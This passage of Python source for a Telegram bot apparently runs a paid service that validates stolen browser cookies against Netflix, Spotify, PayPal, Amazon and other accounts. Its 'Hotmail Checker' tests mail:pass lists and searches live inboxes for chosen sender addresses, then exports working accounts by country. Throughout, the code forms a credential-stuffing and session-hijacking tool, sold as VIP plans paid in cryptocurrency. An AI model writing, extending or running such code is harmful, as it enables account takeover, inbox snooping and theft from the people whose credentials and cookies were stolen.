            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   /activatekey\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            "   ➜ STATUS: SUCCESS\n\n"
            "└───────────────────────────────────────┘"
        )
        await update.message.reply_text(message, parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"Error creating key: {str(e)}")

async def admin_remove_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not ADMIN_USER_ID or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /removekey <key>\nExample: /removekey ABCD1-EFGH2-IJKL3-MNOP4")
        return
    
    key = args[0].strip().upper()
    
    if key not in keys_db:
        await update.message.reply_text(f"Key {key} not found.")
        return
    
    key_data = keys_db[key]
    activated_count = len(key_data.get('activated_by', []))
    
    del keys_db[key]
    save_keys_db()
    
    message = f"Key removed successfully!\n\nKey: {key}\nActivated users: {activated_count}"
    await update.message.reply_text(message)

async def activate_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user:
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /activatekey <key>\nExample: /activatekey ABCD1-EFGH2-IJKL3-MNOP4")
        return
    
    key = args[0].strip().upper()
    username = user.username
    first_name = user.first_name
    
    success, result = activate_key(key, user.id, username, first_name)
    
    if not success:
        error_text = str(result)
        if error_text == "Invalid or non-existent key.":
            message = (
                "┌─── ⋆⋅☆⋅⋆ ── SYSTEM WARNING ── ⋆⋅☆⋅⋆ ───┐\n\n"
                "   ░▒▓█ INVALID KEY DETECTED █▓▒░\n\n"
                "   ⫸ Key: NOT FOUND\n"
                "   ⫸ Error: The key you entered is \n"
                "            incorrect or does not exist.\n\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
                "   Please check your key again or \n"
                "   contact admin for support.\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
                "   ➜ STATUS: FAILED ❌\n\n"
                "└────────────────────────────────────────┘"
            )
            await update.message.reply_text(message)
            return
        elif error_text == "Key has expired." or error_text == "Key is full, cannot activate.":
            key_data = keys_db.get(key, {})
            max_users = key_data.get('max_users', 0)
            activated_count = len(key_data.get('activated_by', []))
            remaining = max_users - activated_count if max_users else 0
            remaining_slots = f"{remaining}/{max_users}" if max_users else "0/0"
            expires_at = key_data.get('expires_at')
            expiry_str = "Unknown"
            if expires_at:
                try:
                    expiry_dt = datetime.fromisoformat(expires_at)
                    expiry_str = expiry_dt.strftime("%Y-%m-%d %H:%M:%S")
                except Exception:
                    expiry_str = expires_at
            message = (
                "┌─── ⋆⋅☆⋅⋆ ── SYSTEM WARNING ── ⋆⋅☆⋅⋆ ───┐\n\n"
                "   ░▒▓█ ACCESS DENIED █▓▒░\n\n"
                f"   ⫸ Key: {key}\n"
                "   ⫸ Reason: Key has expired or \n"
                "             reached maximum usage.\n\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
                f"   ➜ Remaining slots: {remaining_slots}\n"
                f"   ➜ Expiry: {expiry_str}\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
                "   ➜ STATUS: EXPIRED ⚠️\n\n"
                "└────────────────────────────────────────┘"
            )
            await update.message.reply_text(message)
            return
        else:
            await update.message.reply_text(error_text)
            return
    
    activation_info = result['activation_info']
    remaining = result['remaining']
    max_users = result['max_users']
    
    user_message = (
        "┌─── ⋆⋅☆⋅⋆ ── KEY ACTIVATION SUCCESS ── ⋆⋅☆⋅⋆ ───┐\n\n"
        "   ░▒▓█ KEY ACTIVATED █▓▒░\n\n"
        f"   ⫸ Key: {key}\n"
        f"   ⫸ Remaining slots: {remaining}/{max_users}\n\n"
        "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
        "   ➜ STATUS: ACTIVATED ✅\n\n"
        "└────────────────────────────────────────┘"
    )
    await update.message.reply_text(user_message)
    
    admin_message = (
        "┌─── ⋆⋅☆⋅⋆ ── KEY ACTIVATION ── ⋆⋅☆⋅⋆ ───┐\n\n"
        "   ░▒▓█ NOTIFICATION █▓▒░\n\n"
        f"   ⫸ Key: {key}\n"
        f"   ⫸ Activated by: {activation_info['first_name']} (@{activation_info['username']})\n"
        f"   ⫸ User ID: {activation_info['user_id']}\n"
        f"   ⫸ Time: {datetime.fromisoformat(activation_info['activated_at']).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
        f"   ➜ Remaining slots: {remaining}/{max_users}\n"
        "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
        "   ➜ STATUS: ACTIVATED ✅\n\n"
        "└────────────────────────────────────────┘"
    )
    try:
        if ADMIN_USER_ID:
            await context.bot.send_message(chat_id=ADMIN_USER_ID, text=admin_message)
    except Exception as e:
        logger.error(f"Error sending notification to admin: {e}")

async def login_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        user = query.from_user
        chat_id = query.message.chat.id if query.message else None
    else:
        user = update.effective_user
        chat = update.effective_chat
        chat_id = chat.id if chat else None
    
    if user:
        get_user_record(user.id, username=user.username, first_name=user.first_name)

    if user and chat_id is not None and is_restricted_private(user.id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Back", callback_data="back_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if update.callback_query:
            await safe_edit_message_text(query, PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        else:
            await update.message.reply_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return

    registered = user is not None and is_registered(user.id)

    if registered:
        keyboard = [
            [InlineKeyboardButton("Services List", callback_data="services_list"),
             InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
            [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
            [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
             InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
        ]
        if ADMIN_USER_ID and str(user.id) == ADMIN_USER_ID:
            keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = "Cookie Scanner Bot Menu\n\nChoose an option:"
    else:
        keyboard = [
            [InlineKeyboardButton("Create Account", callback_data="create_account")],
            [InlineKeyboardButton("Help", callback_data="help_menu")],
            [InlineKeyboardButton("Back", callback_data="back_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = "Login Menu\n\nChoose an option:"

    if update.callback_query:
        await safe_edit_message_text(update.callback_query, text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        user = query.from_user
    else:
        user = update.effective_user

    keyboard = [
        [InlineKeyboardButton("Create Account", callback_data="create_account")],
        [InlineKeyboardButton("Login", callback_data="login_menu")],
        [InlineKeyboardButton("Back", callback_data="back_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "Help\n\nYou must create an account and then log in before using the bot."

    if update.callback_query:
        await safe_edit_message_text(update.callback_query, text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def create_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        user = query.from_user
        chat_id = query.message.chat.id if query.message else None
    else:
        user = update.effective_user
        chat = update.effective_chat
        chat_id = chat.id if chat else None
    
    if not user:
        return
    
    if chat_id is not None and is_restricted_private(user.id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Back", callback_data="back_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if update.callback_query:
            await safe_edit_message_text(query, PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        else:
            await update.message.reply_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return
    
    user_id = user.id
    user_id_str = str(user_id)
    data = get_user_record(user_id, username=user.username, first_name=user.first_name)
    if not data.get('registered'):
        users_db[user_id_str]['registered'] = True
        users_db[user_id_str]['join_date'] = datetime.now().isoformat()
        if (not ADMIN_USER_ID or user_id_str != ADMIN_USER_ID) and data['plan'] != 'vip':
            users_db[user_id_str]['plan'] = 'normal'
        save_users_db()
    data = get_user_record(user_id, username=user.username, first_name=user.first_name)
    plan_text = "VIP" if data['plan'] == 'vip' else "Normal"
    keyboard = [
        [InlineKeyboardButton("Services List", callback_data="services_list"),
         InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
        [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
        [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
         InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
    ]
    if ADMIN_USER_ID and str(user.id) == ADMIN_USER_ID:
        keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = f"Account Created\n\nUser: {user.first_name or user.username}\nUser ID: {user_id}\nPlan: {plan_text}\nJoin Date: {data.get('join_date','')}\n\nCookie Scanner Bot Menu\n\nChoose an option:"
    if update.callback_query:
        await safe_edit_message_text(update.callback_query, text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    if not user:
        return
    user_id = user.id
    data = query.data
    chat_id = query.message.chat.id
    
    get_user_record(user_id, username=user.username, first_name=user.first_name)

    if chat_id is not None and is_restricted_private(user_id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Back", callback_data="back_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(query, PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return

    if data == 'back_start':
        await show_start_login(query=query)
        return

    if data == 'login_menu':
        await login_menu(update, context)
        return

    if data == 'help_menu':
        await help_menu(update, context)
        return

    if data == 'create_account':
        await create_account(update, context)
        return

    if not is_registered(user_id):
        keyboard = [[InlineKeyboardButton("Create Account", callback_data="create_account")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(
            query,
            "Please create an account to use the bot.\nTap Create Account to continue.",
            reply_markup=reply_markup
        )
        return
    
    if data == 'buy_vip':
        ltc_address = PAYMENT_ACCOUNTS['ltc']
        usdt_address = PAYMENT_ACCOUNTS['usdt_trc20']
        keyboard = [
            [InlineKeyboardButton("Copy LTC", callback_data="copy_ltc"),
             InlineKeyboardButton("Copy USDT-TRC20", callback_data="copy_usdt")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = (
            "VIP Plan Pricing:\n"
            "• 1 Week: 50,000 VND\n"
            "• 3 Weeks: 120,000 VND\n"
            "• 1 Month: 150,000 VND\n\n"
            "Payment Methods:\n"
            f"• LTC: {ltc_address}\n"
            f"• USDT-TRC20: {usdt_address}\n\n"
            "After payment, send the transaction hash and your Telegram ID to @TSP1K33."
        )
        await safe_edit_message_text(query, text, reply_markup=reply_markup)
        return

    if data == 'hotmail_checker':
        context.user_data['mode'] = 'hotmail_keyword'
        context.user_data.pop('selected_service', None)
        context.user_data.pop('keyword_file_path', None)
        keyboard = [
            [InlineKeyboardButton("Skip", callback_data="skip_hotmail_keyword")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(
            query,
            "┌─── ⋆⋅☆⋅⋆ ── HOTMAIL CHECKER ── ⋆⋅☆⋅⋆ ───┐\n\n"
            "   ░▒▓█ SYSTEM READY █▓▒░\n\n"
            "   ⫸ Status: 🟢 Waiting for Keyword\n"
            "   ⫸ Keyword: .txt file or text\n\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   ⚠️  INSTRUCTION:\n"
            "   Step 1: Send a .txt file or message containing keywords.\n"
            "   All keywords MUST be valid email addresses (e.g., info@netflix.com).\n"
            "   to bot use to search in hotmail inbox.\n"
            "   If no keyword, press Skip.\n"
            "   After sending, bot will request a hotmail file\n"
            "   in mail:pass format (.txt, one account per line).\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "└─────────────────────────────────────────┘",
            reply_markup=reply_markup
        )
        return
    if data.startswith('export_country_'):
        country_name = data.replace('export_country_', '')
        country_data = context.user_data.get('country_data', {})
        
        if country_name in country_data:
            lines = country_data[country_name]
            output = f"#Hotmail Live {country_name} @TRUMPHONGBAT\n" + "\n".join(lines)
            buffer = BytesIO(output.encode('utf-8'))
            buffer.name = f"hotmail_live_{country_name}.txt"
            await query.message.reply_document(
                document=buffer,
                filename=buffer.name,
                caption=f"Exported: {country_name} ({len(lines)})"
            )
        else:
            await query.answer(f"No data found for country {country_name}.", show_alert=True)
        return

    if data == 'skip_hotmail_keyword':
        context.user_data['mode'] = 'hotmail_checker'
        context.user_data.pop('keyword_file_path', None)
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(
            query,
            "┌─── ⋆⋅☆⋅⋆ ── HOTMAIL CHECKER ── ⋆⋅☆⋅⋆ ───┐\n\n"
            "   ░▒▓█ SYSTEM READY █▓▒░\n\n"
            "   ⫸ Status: 🟢 Waiting for Input\n"
            "   ⫸ Format: mail:pass\n"
            "   ⫸ Extension: .txt only\n\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   ⚠️  INSTRUCTION:\n"
            "   Please send a .txt file containing \n"
            "   hotmail in format mail:pass, \n"
            "   one per line.\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            "   ➜ [✔] Auto-detect format\n"
            "   ➜ [✔] Fast multi-threading\n"
            "   ➜ [✔] Real-time results\n\n"
            "└─────────────────────────────────────────┘",
            reply_markup=reply_markup
        )
        return
    
    if data == 'show_hotmail_live':
        live_list = context.user_data.get('hotmail_live_list', [])
        if not live_list:
            await query.answer("No live hotmail available.", show_alert=True)
            return
        context.user_data['hotmail_view'] = 'full'
        text_body = "\n".join(live_list)
        keyboard = [[InlineKeyboardButton("Back", callback_data="back_hotmail_status")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(
            query,
            "LIVE HOTMAIL LIST:\n```" + text_body + "```",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    if data == 'show_hotmail_keyword':
        live_with_keyword = context.user_data.get('hotmail_live_with_keyword', [])
        if not live_with_keyword:
            await query.answer("No hotmail with keyword found.", show_alert=True)
            return
        context.user_data['hotmail_view'] = 'keyword'
        text_body = "\n".join(live_with_keyword)
        keyboard = [[InlineKeyboardButton("Back", callback_data="back_hotmail_status")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(
            query,
            "HOTMAIL WITH KEYWORD:\n```" + text_body + "```",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    if data == 'back_hotmail_status':
        context.user_data['hotmail_view'] = 'status'
        status = context.user_data.get('hotmail_status')
        if not status:
            await query.answer("No status to show.", show_alert=True)
            return

        total = status.get('total', 0)
        checked = status.get('checked', 0)
        die_count = status.get('die_count', 0)
        live_list = status.get('live_list', [])
        live_preview = status.get('live_preview', [])
        bar = status.get('bar', '')
        percent = status.get('percent', 0)
        status_line = status.get('status_line', "⏳ Checking...")
        has_keyword = status.get('has_keyword', False)

        live_block = ""
        if checked != total and live_preview:
            preview_lines = "\n".join(f"   {line}" for line in live_preview)
            live_block = (
                "   LIVE HOTMAIL:\n"
                f"{preview_lines}\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            )

        total_live_count = len(live_list)
        if has_keyword:
            live_with_keyword_back = context.user_data.get('hotmail_live_with_keyword', [])
            total_live_count = len(live_list) + len(live_with_keyword_back)
        
        text = (
            "┌─── ⋆⋅☆⋅⋆ ── CHECKING STATUS ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ PROCESSING LIST... █▓▒░\n\n"
            f"   ⫸ Total   : {total}\n"
            f"   ⫸ Checked : {checked}\n"
            "   ░▒▓█░▒▓█░▒▓█░▒▓█░▒▓█░▒▓█┌──?\n"
            f"   🟢 LIVE   : {total_live_count}\n"
            f"   🔴 DIE    : {die_count}\n"
            "   ░▒▓█░▒▓█░▒▓█░▒▓█░▒▓█░▒▓█?\n\n"
            f"{live_block}"
            f"   PROGRESS: {bar} {percent}%\n\n"
            f"   Status: {status_line}\n\n"
            "└────────────────────────────────────────┘"
        )

        keyboard_rows = []
        if has_keyword:
            live_with_keyword_back = context.user_data.get('hotmail_live_with_keyword', [])
            if len(live_list) >= 5:
                keyboard_rows.append([InlineKeyboardButton("Show All Hotmail Live", callback_data="show_hotmail_live")])
            if len(live_with_keyword_back) >= 1:
                keyboard_rows.append([InlineKeyboardButton("Show Hotmail With Keyword", callback_data="show_hotmail_keyword")])
        elif len(live_list) >= 5:
            keyboard_rows.append([InlineKeyboardButton("Show Hotmail Live", callback_data="show_hotmail_live")])
        reply_markup = InlineKeyboardMarkup(keyboard_rows) if keyboard_rows else None

        await safe_edit_message_text(query, text, reply_markup=reply_markup)
        return

    if data == 'admin_panel':
        if not ADMIN_USER_ID or str(user_id) != ADMIN_USER_ID:
            await safe_edit_message_text(query, "You don't have permission to use this feature.")
            return
        keyboard = [
            [InlineKeyboardButton("Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("Set VIP", callback_data="admin_set_vip")],
            [InlineKeyboardButton("Delete VIP", callback_data="admin_del_vip")],
            [InlineKeyboardButton("Get Key", callback_data="admin_get_key")],
            [InlineKeyboardButton("Remove Key", callback_data="admin_remove_key")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(query, "Admin Panel\n\nChoose an option:", reply_markup=reply_markup)
        return

    if data == 'admin_stats':
        fake_update = Update(update.update_id, callback_query=query)
        await admin_stats(fake_update, context)
        return

    if data == 'admin_set_vip':
        await safe_edit_message_text(query, "Use command: /setvip <user_id> <days>")
        return

    if data == 'admin_del_vip':
        await safe_edit_message_text(query, "Use command: /delvip <user_id>")
        return

    if data == 'admin_get_key':
        await safe_edit_message_text(query, "Use command: /getkey <duration> <max_users>\nExample: /getkey 1hours 1 or /getkey 1day 5")
        return

    if data == 'admin_remove_key':
        await safe_edit_message_text(query, "Use command: /removekey <key>\nExample: /removekey ABCD1-EFGH2-IJKL3-MNOP4")
        return

    if data == 'check_plan':
        fake_update = Update(update.update_id, callback_query=query)
        await check_plan(fake_update, context)
        return
    
    if data == 'copy_ltc':
        wallet_address = PAYMENT_ACCOUNTS['ltc']
        await query.message.reply_text(f"LTC Address: {wallet_address}")
        return
    
    if data == 'copy_usdt':
        wallet_address = PAYMENT_ACCOUNTS['usdt_trc20']
        await query.message.reply_text(f"USDT-TRC20 Address: {wallet_address}")
        return

    if data == 'main_menu':
        context.user_data.pop('mode', None)
        keyboard = [
            [InlineKeyboardButton("Services List", callback_data="services_list"),
             InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
            [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
            [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
             InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
        ]
        if ADMIN_USER_ID and str(user_id) == ADMIN_USER_ID:
            keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(query, "Cookie Scanner Bot Menu\n\nChoose an option:", reply_markup=reply_markup)
        return

    if data == 'services_list':
        context.user_data.pop('mode', None)
        keyboard = [
            [InlineKeyboardButton("Netflix", callback_data="service_netflix"),
             InlineKeyboardButton("Spotify", callback_data="service_spotify")],
            [InlineKeyboardButton("TikTok", callback_data="service_tiktok"),
             InlineKeyboardButton("Facebook", callback_data="service_facebook")],
            [InlineKeyboardButton("Canva", callback_data="service_canva"),
             InlineKeyboardButton("Roblox", callback_data="service_roblox")],
            [InlineKeyboardButton("Instagram", callback_data="service_instagram"),
             InlineKeyboardButton("YouTube", callback_data="service_youtube")],
            [InlineKeyboardButton("LinkedIn", callback_data="service_linkedin"),
             InlineKeyboardButton("Amazon", callback_data="service_amazon")],
            [InlineKeyboardButton("WordPress", callback_data="service_wordpress"),
             InlineKeyboardButton("CapCut", callback_data="service_capcut")],
            [InlineKeyboardButton("PayPal", callback_data="service_paypal")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(query, "Select service:", reply_markup=reply_markup)
        return

    if data == 'scan_all':
        context.user_data.pop('mode', None)
        context.user_data['selected_service'] = 'all'
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(
            query,
            "┌─── ⋆⋅☆⋅⋆ ── SERVICE SELECTION ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ SCANNING CONFIG █▓▒░\n\n"
            "   ⫸ Selected: Scan All Services\n"
            "   ⫸ Requirement: .txt or .zip\n"
            "   ⫸ Type: Cookie File\n\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   ⚠️  ACTION REQUIRED:\n"
            "   Now send .txt or .zip cookie file \n"
            "   to start the scanning process.\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            "   ➜ STATUS: WAITING FOR FILE... 📁\n\n"
            "└──────────────────────────────────────────┘",
            reply_markup=reply_markup
        )
        return

    if data.startswith('service_'):
        context.user_data.pop('mode', None)
        service_key = data.split('service_')[1]
        context.user_data['selected_service'] = service_key
        keyboard = [[InlineKeyboardButton("Back", callback_data="services_list")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_message_text(
            query,
            "┌─── ⋆⋅☆⋅⋆ ── SERVICE SELECTION ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ SCANNING CONFIG █▓▒░\n\n"
            f"   ⫸ Selected: {SERVICES.get(service_key, 'Unknown')}\n"
            "   ⫸ Requirement: .txt or .zip\n"
            "   ⫸ Type: Cookie File\n\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   ⚠️  ACTION REQUIRED:\n"
            "   Now send .txt or .zip cookie file \n"
            "   to start the scanning process.\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            "   ➜ STATUS: WAITING FOR FILE... 📁\n\n"
            "└──────────────────────────────────────────┘",
            reply_markup=reply_markup
        )


def scan_cookie_content(content, service_name, original_content=None):
    try:
        cookies = parse_cookies_txt(content)
        if not cookies:
            return {'error': 'No valid cookies found in file'}
        if service_name == 'all':
            results = {}
            for service_key, service_info in SCAN_TARGETS.items():
                service_domains = service_info['domains']
                filtered_cookies = filter_cookies_by_domain(cookies, service_domains)
                if filtered_cookies:
                    test_function = SERVICE_TEST_FUNCTIONS.get(service_key)
                    if test_function:
                        result = test_function(filtered_cookies)
                        if not isinstance(result, dict):
                            result = {'status': 'unknown','message': 'Internal error while testing cookies'}
                        result['cookie_count'] = len(filtered_cookies)
                        result['service_name'] = service_key
                        if original_content and result.get('status') == 'success':
                            result['original_content'] = original_content
                        results[service_key] = result
            return {'all_results': results}
        else:
            if service_name not in SCAN_TARGETS:
                return {'error': f'Scan not supported for {service_name}'}
            service_domains = SCAN_TARGETS[service_name]['domains']
            filtered_cookies = filter_cookies_by_domain(cookies, service_domains)
            if not filtered_cookies:
                return {'error': f'No suitable cookies found for {service_name}'}
            test_function = SERVICE_TEST_FUNCTIONS.get(service_name)
            if not test_function:
                return {'error': f'Scan not supported for {service_name}'}
            result = test_function(filtered_cookies)
            if not isinstance(result, dict):
                result = {'status': 'unknown','message': 'Internal error while testing cookies'}
            result['cookie_count'] = len(filtered_cookies)
            if original_content and result.get('status') == 'success':
                result['original_content'] = original_content
            return result
    except Exception as e:
        return {'error': f'Error scanning cookie: {str(e)}'}

def parse_hotmail_line(line):
    line = line.strip()
    if not line or '@' not in line or ':' not in line:
        return None
    email, password = line.split(':', 1)
    email = email.strip()
    password = password.strip()
    if not email or '@' not in email or not password:
        return None
    return email, password

OUTLOOK_CHECKER = None

def get_outlook_checker():
    global OUTLOOK_CHECKER
    if OUTLOOK_CHECKER is not None:
        return OUTLOOK_CHECKER
    try:
        checker = OutlookChecker(keyword_file=None, debug=False)
    except TypeError:
        try:
            checker = OutlookChecker(None, False)
        except TypeError:
            checker = OutlookChecker()
    OUTLOOK_CHECKER = checker
    return OUTLOOK_CHECKER

def check_hotmail_api(email, password):
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return 'die'
    max_retry = 3
    result = "❌ ERROR"
    for attempt in range(max_retry):
        try:
            try:
                checker = OutlookChecker(keyword_file=None, debug=False)
            except TypeError:
                try:
                    checker = OutlookChecker(None, False)
                except TypeError:
                    checker = OutlookChecker()
            result = checker.check(email, password)
            if any(x in result for x in ["✅ HIT", "🆓 FREE", "❌ BAD", "Locked", "Need Verify", "Timeout"]):
                break
            elif "Request Error" in result or "ERROR" in result:
                if attempt + 1 >= max_retry:
                    break
                time.sleep(1)
            else:
                break
        except Exception as e:
            result = f"❌ ERROR: {str(e)}"
            if attempt + 1 >= max_retry:
                break
            time.sleep(1)
    if any(x in result for x in ["✅ HIT", "🆓 FREE"]):
        return 'live'
    return 'die'

def check_hotmail_api_with_keywords(email, password, keyword_file=None):
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return 'die', False
    max_retry = 3
    result = "❌ ERROR"
    for attempt in range(max_retry):
        try:
            try:
                if keyword_file:
                    checker = OutlookChecker(keyword_file=keyword_file, debug=False)
                else:
                    checker = OutlookChecker(keyword_file=None, debug=False)
            except TypeError:
                try:
                    if keyword_file:
                        checker = OutlookChecker(keyword_file, False)
                    else:
                        checker = OutlookChecker(None, False)
                except TypeError:
                    checker = OutlookChecker()
            result = checker.check(email, password)
            if any(x in result for x in ["✅ HIT", "🆓 FREE", "❌ BAD", "Locked", "Need Verify", "Timeout"]):
                break
            elif "Request Error" in result or "ERROR" in result:
                if attempt + 1 >= max_retry:
                    break
                time.sleep(1)
            else:
                break
        except Exception as e:
            result = f"❌ ERROR: {str(e)}"
            if attempt + 1 >= max_retry:
                break
            time.sleep(1)
    if any(x in result for x in ["✅ HIT", "🆓 FREE"]):
        has_keyword = "✅ HIT" in result
        keyword_string = ""
        if has_keyword and "Found:" in result:
            try:
                found_part = result.split("Found:")[1].split("|")[0].strip()
                keywords_found = []
                import re
                keyword_pattern = r'([^,()]+)\s*\([^)]+\)'
                matches = re.findall(keyword_pattern, found_part)
                keywords_found = [m.strip() for m in matches]
                if keywords_found:
                    keyword_string = ", ".join(keywords_found)
            except Exception:
                keyword_string = ""
        return 'live', has_keyword, keyword_string
    return 'die', False, ""

def process_single_file(file_name, content, selected_service):
    try:
        result = scan_cookie_content(content, selected_service, original_content=content)
        return file_name, result
    except Exception as e:
        return file_name, {'error': f'Error processing file: {str(e)}'}
    
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user:
        return
    
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    is_group_chat = chat_id and str(chat_id).startswith("-")
    
    if is_group_chat:
        has_selected_service = 'selected_service' in context.user_data
        has_mode = 'mode' in context.user_data and context.user_data.get('mode') in ['hotmail_checker', 'hotmail_keyword']
        
        if not has_selected_service and not has_mode:
            message_text = update.message.text or ""
            bot_username = context.bot.username if context.bot else None
            is_mentioned = False
            
            if bot_username:
                is_mentioned = f"@{bot_username}" in message_text or f"/start@{bot_username}" in message_text.lower()
            is_reply_to_bot = False
            if update.message.reply_to_message:
                replied_user = update.message.reply_to_message.from_user
                if replied_user and replied_user.is_bot:
                    is_reply_to_bot = True
            
            if not is_mentioned and not is_reply_to_bot:
                return
    
    if not is_registered(user.id):
